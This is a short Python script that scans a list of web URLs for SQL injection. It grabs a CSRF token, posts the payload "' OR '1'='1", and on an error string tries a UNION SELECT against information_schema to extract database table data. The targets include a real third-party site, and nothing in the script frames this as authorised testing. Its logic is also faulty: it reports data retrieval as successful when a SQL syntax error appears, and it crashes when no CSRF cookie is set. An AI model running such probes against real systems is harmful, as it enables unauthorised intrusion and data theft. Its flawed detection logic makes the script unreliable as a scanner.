import requests

def scan_url(url):
    csrf_token = None
    sql_injection_detected = False

    # Get the CSRF token from a GET request
    try:
        response = requests.get(url)
        if response.status_code == 200:
            csrf_token = response.cookies['csrftoken']
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} is down")
        return

    # Submit a POST request with the CSRF token and a payload that can trigger SQL injection
    headers = {
        "Referer": url,
        "X-CSRFToken": csrf_token
    }
    payload = "' OR '1'='1"
    try:
        response = requests.post(url, headers=headers, data={"input_field": payload})
        if response.status_code == 200:
            print(f"[+] {url} is up")
            if "SQL syntax" in response.text:
                sql_injection_detected = True
                print(f"[!!] SQL injection detected")
            else:
                print(f"[!!] No SQL injection detected")
        else:
            print(f"[-] {url} returned status code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} is down")

    # If SQL injection is detected, try to retrieve data from the database
    if sql_injection_detected:
        payload = "' UNION SELECT * FROM information_schema.tables--"
        try:
            response = requests.post(url, headers=headers, data={"input_field": payload})
            if "SQL syntax" in response.text:
                print(f"[!!] Data retrieval successful")
            else:
                print(f"[!!] Data retrieval failed")
        except requests.exceptions.RequestException as e:
            print(f"[-] {url} is down")

if __name__ == "__main__":
    urls = [
        "http://www.google.com",
        "http://www.example.com",
        "http://www.nonexistent.com"
    ]

    for url in urls:
        scan_url(url)
